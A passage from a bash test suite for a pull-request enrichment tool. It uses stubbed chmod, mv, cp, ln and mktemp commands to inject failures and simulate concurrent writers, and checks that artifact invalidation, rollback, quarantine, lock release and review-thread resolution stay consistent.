    "publisher TERM after coherent commit preserves the direct cancellation status"
assert_true "$([ ! -e "$PUBLISH_TERM_DIR/analysis.json" ] && \
    [ ! -e "$PUBLISH_TERM_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "publisher TERM reports the coherent committed state and releases its lease"

# mktemp -d already creates a private quarantine. A hostile chmod failpoint for
# that path must be unreachable, so successful invalidation cannot strand a
# recovery residue before traps are installed.
QUARANTINE_MODE_DIR="$TEST_OUTPUT_DIR/quarantine-mode"
QUARANTINE_MODE_STUBS="$TEST_OUTPUT_DIR/quarantine-mode-stubs"
QUARANTINE_MODE_MARKER="$TEST_OUTPUT_DIR/quarantine-mode-fired"
mkdir -p "$QUARANTINE_MODE_DIR" "$QUARANTINE_MODE_STUBS"
echo '{"selected":"quarantine-mode"}' > "$QUARANTINE_MODE_DIR/analysis.json"
cat > "$QUARANTINE_MODE_STUBS/chmod" << 'STUB'
#!/bin/bash
for candidate in "$@"; do
    case "$candidate" in
        "$QUARANTINE_MODE_REPORT"/.selected-analysis-quarantine.*)
            : > "$QUARANTINE_MODE_MARKER"
            exit 77
            ;;
    esac
done
exec "$REAL_CHMOD" "$@"
STUB
chmod +x "$QUARANTINE_MODE_STUBS/chmod"
env PATH="$QUARANTINE_MODE_STUBS:$PATH" \
    REAL_CHMOD="$(command -v chmod)" \
    QUARANTINE_MODE_REPORT="$QUARANTINE_MODE_DIR" \
    QUARANTINE_MODE_MARKER="$QUARANTINE_MODE_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$QUARANTINE_MODE_DIR" >/dev/null 2>&1
assert_true "$([ ! -e "$QUARANTINE_MODE_MARKER" ] && \
    [ ! -e "$QUARANTINE_MODE_DIR/analysis.json" ] && \
    ! find "$QUARANTINE_MODE_DIR" -name '.selected-analysis-quarantine.*' \
        -print -quit | grep -q . && echo 0 || echo 1)" \
    "private quarantine setup has no chmod failure residue path"

# If quarantining a later selected view fails, restore every earlier claimed
# original without changing its bytes or mode.
ROLLBACK_INVALIDATION_DIR="$TEST_OUTPUT_DIR/rollback-invalidation"
ROLLBACK_MV_STUBS="$TEST_OUTPUT_DIR/rollback-mv-stubs"
ROLLBACK_MV_COUNT="$TEST_OUTPUT_DIR/rollback-mv-count"
mkdir -p "$ROLLBACK_INVALIDATION_DIR" "$ROLLBACK_MV_STUBS"
cat > "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md" << 'EOF'
# Rollback base
<!-- BEGIN SELECTED ANALYSIS -->
ROLLBACK STALE FINDING
<!-- END SELECTED ANALYSIS -->
EOF
chmod 640 "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md"
cat > "$ROLLBACK_INVALIDATION_DIR/combined-data.json" << 'EOF'
{"base":"keep","analysis":{"selected":true},"analysis_context_coverage":{"included":true}}
EOF
echo '{"selected":true}' > "$ROLLBACK_INVALIDATION_DIR/analysis.json"
cat > "$ROLLBACK_MV_STUBS/mv" << 'STUB'
#!/bin/bash
count=0
[ ! -f "$MV_COUNT_FILE" ] || read -r count < "$MV_COUNT_FILE"
count=$((count + 1))
printf '%s\n' "$count" > "$MV_COUNT_FILE"
[ "$count" -ne "$MV_FAIL_ON" ] || exit 73
exec "$REAL_MV" "$@"
STUB
chmod +x "$ROLLBACK_MV_STUBS/mv"
rc=0
env PATH="$ROLLBACK_MV_STUBS:$PATH" REAL_MV="$(command -v mv)" \
    MV_COUNT_FILE="$ROLLBACK_MV_COUNT" MV_FAIL_ON=2 \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$ROLLBACK_INVALIDATION_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a later report rename failure makes invalidation fail"
assert_contains "$(cat "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md")" \
    "ROLLBACK STALE FINDING" \
    "failed combined-data publication restores the original comprehensive report"
assert_eq "640" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode \
        "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md")" \
    "cross-artifact rollback preserves the comprehensive report mode"
assert_jq "$ROLLBACK_INVALIDATION_DIR/combined-data.json" \
    '.analysis.selected == true and .analysis_context_coverage.included == true' \
    "failed invalidation preserves the selected combined-data view"
assert_true "$([ -f "$ROLLBACK_INVALIDATION_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "failed cross-artifact invalidation preserves selected JSON"

# Copying several originals into the private transaction takes time. A source
# backed up earlier must still match that backup when the last copy finishes.
BACKUP_RACE_DIR="$TEST_OUTPUT_DIR/backup-race-invalidation"
BACKUP_RACE_STUBS="$TEST_OUTPUT_DIR/backup-race-stubs"
BACKUP_RACE_MARKER="$TEST_OUTPUT_DIR/backup-race-mutated"
mkdir -p "$BACKUP_RACE_DIR" "$BACKUP_RACE_STUBS"
cp "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md" \
    "$BACKUP_RACE_DIR/comprehensive-report.md"
cp "$ROLLBACK_INVALIDATION_DIR/combined-data.json" \
    "$BACKUP_RACE_DIR/combined-data.json"
echo '{"selected":true}' > "$BACKUP_RACE_DIR/analysis.json"
cat > "$BACKUP_RACE_STUBS/cp" << 'STUB'
#!/bin/bash
"$REAL_CP" "$@" || exit $?
copy_source=""
previous=""
for argument in "$@"; do
    copy_source="$previous"
    previous="$argument"
done
if [ "$copy_source" = "$CP_MUTATE_AFTER_SOURCE" ] && \
   [ ! -f "$CP_MUTATION_MARKER" ]; then
    printf '%s\n' \
        '{"concurrent":"preserved","analysis":{"selected":"concurrent"},"analysis_context_coverage":{"included":true}}' \
        > "$CP_MUTATION_TARGET"
    : > "$CP_MUTATION_MARKER"
fi
STUB
chmod +x "$BACKUP_RACE_STUBS/cp"
rc=0
env PATH="$BACKUP_RACE_STUBS:$PATH" REAL_CP="$(command -v cp)" \
    CP_MUTATE_AFTER_SOURCE="$BACKUP_RACE_DIR/analysis.json" \
    CP_MUTATION_TARGET="$BACKUP_RACE_DIR/combined-data.json" \
    CP_MUTATION_MARKER="$BACKUP_RACE_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$BACKUP_RACE_DIR" >/dev/null 2>&1 || rc=$?
assert_eq "0" "$rc" \
    "invalidation can capture a not-yet-backed report that changes during backup"
assert_jq "$BACKUP_RACE_DIR/combined-data.json" \
    '.concurrent == "preserved" and
     (has("analysis") | not) and (has("analysis_context_coverage") | not)' \
    "replacement rendering preserves concurrent base data captured by its backup"
assert_not_contains "$(cat "$BACKUP_RACE_DIR/comprehensive-report.md")" \
    "ROLLBACK STALE FINDING" \
    "backup-first rendering completes the comprehensive invalidation coherently"
assert_true "$([ ! -e "$BACKUP_RACE_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "backup-first invalidation removes the selected artifact"

# After originals are quarantined, a destination can reappear before publish.
# The no-clobber link must abort, leave concurrent paths untouched, and retain
# quarantined originals when restore also finds the collision.
BOUNDARY_DIR="$TEST_OUTPUT_DIR/publication-boundary-invalidation"
BOUNDARY_STUBS="$TEST_OUTPUT_DIR/publication-boundary-stubs"
BOUNDARY_MARKER="$TEST_OUTPUT_DIR/publication-boundary-fired"
mkdir -p "$BOUNDARY_DIR" "$BOUNDARY_STUBS"
cp "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md" \
    "$BOUNDARY_DIR/comprehensive-report.md"
cp "$ROLLBACK_INVALIDATION_DIR/combined-data.json" \
    "$BOUNDARY_DIR/combined-data.json"
echo '{"selected":"original"}' > "$BOUNDARY_DIR/analysis.json"
cat > "$BOUNDARY_STUBS/ln" << 'STUB'
#!/bin/bash
if [ ! -f "$BOUNDARY_MARKER" ]; then
    printf '%s\n' '{"selected":"concurrent"}' > "$BOUNDARY_ANALYSIS_TARGET"
    printf '%s\n' '{"concurrent":"combined"}' > "$BOUNDARY_COMBINED_TARGET"
    : > "$BOUNDARY_MARKER"
fi
exec "$REAL_LN" "$@"
STUB
chmod +x "$BOUNDARY_STUBS/ln"
rc=0
env PATH="$BOUNDARY_STUBS:$PATH" REAL_LN="$(command -v ln)" \
    BOUNDARY_MARKER="$BOUNDARY_MARKER" \
    BOUNDARY_ANALYSIS_TARGET="$BOUNDARY_DIR/analysis.json" \
    BOUNDARY_COMBINED_TARGET="$BOUNDARY_DIR/combined-data.json" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$BOUNDARY_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a destination reappearing at publication aborts invalidation"
assert_jq "$BOUNDARY_DIR/analysis.json" '.selected == "concurrent"' \
    "delete-boundary collision leaves concurrent selected JSON untouched"
assert_jq "$BOUNDARY_DIR/combined-data.json" '.concurrent == "combined"' \
    "publish-boundary collision never clobbers concurrent combined data"
BOUNDARY_QUARANTINE=$(find "$BOUNDARY_DIR" -maxdepth 1 -type d \
    -name '.selected-analysis-quarantine.*' -print -quit)
assert_true "$([ -n "$BOUNDARY_QUARANTINE" ] && \
    [ -f "$BOUNDARY_QUARANTINE/analysis.json" ] && \
    [ -f "$BOUNDARY_QUARANTINE/combined-data.json" ] && echo 0 || echo 1)" \
    "restore-boundary collisions preserve original artifacts in quarantine"
assert_true "$([ ! -e "$BOUNDARY_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "failed publication releases the cooperative writer lock"

# A publication can fail after an earlier replacement was linked successfully.
# Rollback first claims that replacement by moving it to quarantine. If another
# writer recreates the pathname at that exact boundary, the concurrent bytes
# must remain live and the original must remain recoverable in quarantine.
ROLLBACK_BOUNDARY_DIR="$TEST_OUTPUT_DIR/rollback-boundary-invalidation"
ROLLBACK_BOUNDARY_STUBS="$TEST_OUTPUT_DIR/rollback-boundary-stubs"
ROLLBACK_BOUNDARY_LN_COUNT="$TEST_OUTPUT_DIR/rollback-boundary-ln-count"
ROLLBACK_BOUNDARY_MARKER="$TEST_OUTPUT_DIR/rollback-boundary-fired"
mkdir -p "$ROLLBACK_BOUNDARY_DIR" "$ROLLBACK_BOUNDARY_STUBS"
cp "$ROLLBACK_INVALIDATION_DIR/comprehensive-report.md" \
    "$ROLLBACK_BOUNDARY_DIR/comprehensive-report.md"
cp "$ROLLBACK_INVALIDATION_DIR/combined-data.json" \
    "$ROLLBACK_BOUNDARY_DIR/combined-data.json"
echo '{"selected":"original"}' > "$ROLLBACK_BOUNDARY_DIR/analysis.json"
cat > "$ROLLBACK_BOUNDARY_STUBS/ln" << 'STUB'
#!/bin/bash
case "$2" in
    "$ROLLBACK_BOUNDARY_REPORT"/combined-data.json|\
    "$ROLLBACK_BOUNDARY_REPORT"/comprehensive-report.md)
        count=0
        [ ! -f "$ROLLBACK_LN_COUNT" ] || read -r count < "$ROLLBACK_LN_COUNT"
        count=$((count + 1))
        printf '%s\n' "$count" > "$ROLLBACK_LN_COUNT"
        [ "$count" -ne 2 ] || exit 76
        ;;
esac
exec "$REAL_LN" "$@"
STUB
cat > "$ROLLBACK_BOUNDARY_STUBS/mv" << 'STUB'
#!/bin/bash
"$REAL_MV" "$@" || exit $?
case "$2" in
    */.published-combined-data.json)
        if [ ! -f "$ROLLBACK_BOUNDARY_MARKER" ]; then
            printf '%s\n' '{"concurrent":"rollback-boundary"}' \
                > "$ROLLBACK_BOUNDARY_TARGET"
            : > "$ROLLBACK_BOUNDARY_MARKER"
        fi
        ;;
esac
STUB
chmod +x "$ROLLBACK_BOUNDARY_STUBS/ln" "$ROLLBACK_BOUNDARY_STUBS/mv"
rc=0
env PATH="$ROLLBACK_BOUNDARY_STUBS:$PATH" \
    REAL_LN="$(command -v ln)" REAL_MV="$(command -v mv)" \
    ROLLBACK_LN_COUNT="$ROLLBACK_BOUNDARY_LN_COUNT" \
    ROLLBACK_BOUNDARY_REPORT="$ROLLBACK_BOUNDARY_DIR" \
    ROLLBACK_BOUNDARY_MARKER="$ROLLBACK_BOUNDARY_MARKER" \
    ROLLBACK_BOUNDARY_TARGET="$ROLLBACK_BOUNDARY_DIR/combined-data.json" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$ROLLBACK_BOUNDARY_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a concurrent destination appearing during rollback fails reconciliation"
assert_jq "$ROLLBACK_BOUNDARY_DIR/combined-data.json" \
    '.concurrent == "rollback-boundary"' \
    "rollback never removes a concurrently recreated destination"
ROLLBACK_BOUNDARY_QUARANTINE=$(find "$ROLLBACK_BOUNDARY_DIR" -maxdepth 1 -type d \
    -name '.selected-analysis-quarantine.*' -print -quit)
assert_true "$([ -n "$ROLLBACK_BOUNDARY_QUARANTINE" ] && \
    [ -f "$ROLLBACK_BOUNDARY_QUARANTINE/combined-data.json" ] && \
    jq -e '.analysis.selected == true' \
        "$ROLLBACK_BOUNDARY_QUARANTINE/combined-data.json" >/dev/null 2>&1 && \
    echo 0 || echo 1)" \
    "rollback preserves the original collided view in quarantine"
assert_true "$([ ! -e "$ROLLBACK_BOUNDARY_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "rollback-boundary failure releases the cooperative writer lock"

# A same-head reply posted while resolveReviewThread is in flight is concurrent
# reviewer-owned state. Invalidate locally, but never overwrite it by reopening.
git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
: > "$LOCAL_MUTATION_LOG"
SAME_HEAD_REPLY_OUT=$(printf 'f' | (cd "$LOCAL_MUTATION_WS" && \
    env GH_HEAD_MODE=captured GH_REPLY_AFTER_MUTATION=true \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$SAME_HEAD_REPLY_OUT" "reviewer-owned state changed" \
    "a same-head reply during mutation requires manual reconciliation"
assert_not_contains "$(cat "$LOCAL_MUTATION_LOG")" "unresolve:PRRT_local" \
    "same-head discussion drift does not overwrite concurrent reviewer state"
assert_not_contains "$SAME_HEAD_REPLY_OUT" "Resolved: PRRT_local" \
    "same-head discussion drift is not reported as successful resolution"

# A failed or malformed GraphQL response is ambiguous because GitHub can apply
# the mutation before the transport fails. Live captured identity resolves that
# ambiguity and still runs the normal post-mutation validation.
for RESOLVE_MODE in applied_nonzero applied_malformed; do
    git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
    cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
    cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
    : > "$LOCAL_MUTATION_LOG"
    AMBIGUOUS_APPLY_OUT=$(printf 'f' | (cd "$LOCAL_MUTATION_WS" && \
        env GH_HEAD_MODE=captured GH_RESOLVE_MODE="$RESOLVE_MODE" \
        GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
        "$GH_PR_ENRICH" address 999 2>&1) || true)
    assert_contains "$AMBIGUOUS_APPLY_OUT" "Resolved: PRRT_local" \
        "$RESOLVE_MODE is accepted only after live state proves application"
    assert_not_contains "$(cat "$LOCAL_MUTATION_LOG")" "unresolve:PRRT_local" \
        "$RESOLVE_MODE does not compensate a verified stable resolution"
done

# Freeze the bytes the operator reviewed. A valid same-provenance replacement
# while the prompt is open must not change the task that is later authorized.
git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
chmod 644 "$LOCAL_MUTATION_REPORT/analysis-context.json" \
    "$LOCAL_MUTATION_REPORT/analysis.json"
ANALYSIS_RACE_FIFO="$TEST_OUTPUT_DIR/analysis-race.fifo"
ANALYSIS_RACE_OUT_FILE="$TEST_OUTPUT_DIR/analysis-race.out"
FROZEN_MODE_STUBS="$TEST_OUTPUT_DIR/frozen-mode-stubs"
FROZEN_MODE_LOG="$TEST_OUTPUT_DIR/frozen-mode.log"
mkdir -p "$FROZEN_MODE_STUBS"
cat > "$FROZEN_MODE_STUBS/mktemp" << 'STUB'
#!/bin/bash
result="$("$REAL_MKTEMP" "$@")" || exit $?
case "$1" in
    /tmp/gh-pr-enrich-address-analysis.*|/tmp/gh-pr-enrich-address-context.*)
        printf '%s\t%s\n' "$1" "$result" >> "$FROZEN_MODE_LOG"
        ;;
esac
printf '%s\n' "$result"
STUB
chmod +x "$FROZEN_MODE_STUBS/mktemp"
rm -f "$ANALYSIS_RACE_FIFO"
mkfifo "$ANALYSIS_RACE_FIFO"
: > "$ANALYSIS_RACE_OUT_FILE"
: > "$FROZEN_MODE_LOG"
: > "$LOCAL_MUTATION_LOG"
exec 3<> "$ANALYSIS_RACE_FIFO"
(cd "$LOCAL_MUTATION_WS" && env GH_HEAD_MODE=captured \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" REAL_MKTEMP="$(command -v mktemp)" \
    FROZEN_MODE_LOG="$FROZEN_MODE_LOG" \
    PATH="$FROZEN_MODE_STUBS:$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 < "$ANALYSIS_RACE_FIFO" \
    > "$ANALYSIS_RACE_OUT_FILE" 2>&1) &
ANALYSIS_RACE_PID=$!
for _attempt in $(seq 1 100); do
    grep -q '\[f\]ixed' "$ANALYSIS_RACE_OUT_FILE" 2>/dev/null && break
    sleep 0.02
done
FROZEN_ANALYSIS_PATH=$(awk -F '\t' '$1 ~ /address-analysis/ {print $2; exit}' \
    "$FROZEN_MODE_LOG")
FROZEN_CONTEXT_PATH=$(awk -F '\t' '$1 ~ /address-context/ {print $2; exit}' \
    "$FROZEN_MODE_LOG")
assert_eq "644" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode \
        "$LOCAL_MUTATION_REPORT/analysis.json")" \
    "address can start from a world-readable selected analysis fixture"
assert_eq "644" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode \
        "$LOCAL_MUTATION_REPORT/analysis-context.json")" \
    "address can start from a world-readable context fixture"
assert_eq "600" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode "$FROZEN_ANALYSIS_PATH")" \
    "address freezes selected analysis with private permissions"
assert_eq "600" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode "$FROZEN_CONTEXT_PATH")" \
    "address freezes analysis context with private permissions"
jq '.task_list[0].task = "REPLACED AFTER DISPLAY"' \
    "$LOCAL_ANALYSIS_TEMPLATE" > "$LOCAL_MUTATION_REPORT/analysis.json"
printf 'f' >&3
exec 3>&-
wait "$ANALYSIS_RACE_PID" || true
ANALYSIS_RACE_OUT=$(cat "$ANALYSIS_RACE_OUT_FILE")
assert_contains "$ANALYSIS_RACE_OUT" "LOCAL MUTATION TASK" \
    "address displays tasks from its private frozen analysis"
assert_contains "$ANALYSIS_RACE_OUT" "Selected analysis or thread provenance changed" \
    "address rejects selected-analysis replacement while the prompt is open"
assert_eq "" "$(cat "$LOCAL_MUTATION_LOG")" \
    "analysis replacement sends no thread-resolution mutation"

# A self-consistent context refresh while the prompt is open also invalidates
# the selected metadata binding before any GraphQL mutation.
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
CONTEXT_RACE_TMP="$TEST_OUTPUT_DIR/address-context-race.tmp.json"
CONTEXT_RACE_REPLACEMENT="$TEST_OUTPUT_DIR/address-context-race.json"
jq 'del(.coverage.context_fingerprint)
    | .unresolved_threads = [{thread_id:"PRRT_from_another_pr",
        comments_complete:true,comment_identity:[]}]' \
    "$LOCAL_CONTEXT_TEMPLATE" > "$CONTEXT_RACE_TMP"
ADDRESS_CONTEXT_RACE_FINGERPRINT=$("$GH_PR_ENRICH" --test-call \
    analysis_context_fingerprint "$CONTEXT_RACE_TMP")
jq --arg fingerprint "$ADDRESS_CONTEXT_RACE_FINGERPRINT" \
    '.coverage.context_fingerprint = $fingerprint' \
    "$CONTEXT_RACE_TMP" > "$CONTEXT_RACE_REPLACEMENT"
CONTEXT_RACE_FIFO="$TEST_OUTPUT_DIR/context-race.fifo"
CONTEXT_RACE_OUT_FILE="$TEST_OUTPUT_DIR/context-race.out"
rm -f "$CONTEXT_RACE_FIFO"
mkfifo "$CONTEXT_RACE_FIFO"
: > "$CONTEXT_RACE_OUT_FILE"
: > "$LOCAL_MUTATION_LOG"
exec 4<> "$CONTEXT_RACE_FIFO"
(cd "$LOCAL_MUTATION_WS" && env GH_HEAD_MODE=captured \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 < "$CONTEXT_RACE_FIFO" \
    > "$CONTEXT_RACE_OUT_FILE" 2>&1) &
CONTEXT_RACE_PID=$!
for _attempt in $(seq 1 100); do
    grep -q '\[f\]ixed' "$CONTEXT_RACE_OUT_FILE" 2>/dev/null && break
    sleep 0.02
done
cp "$CONTEXT_RACE_REPLACEMENT" "$LOCAL_MUTATION_REPORT/analysis-context.json"
printf 'f' >&4
exec 4>&-
wait "$CONTEXT_RACE_PID" || true
CONTEXT_RACE_OUT=$(cat "$CONTEXT_RACE_OUT_FILE")
assert_contains "$CONTEXT_RACE_OUT" "Selected analysis or thread provenance changed" \
    "address rejects context replacement while the prompt is open"
assert_eq "" "$(cat "$LOCAL_MUTATION_LOG")" \
    "context replacement sends no thread-resolution mutation"

suite_end
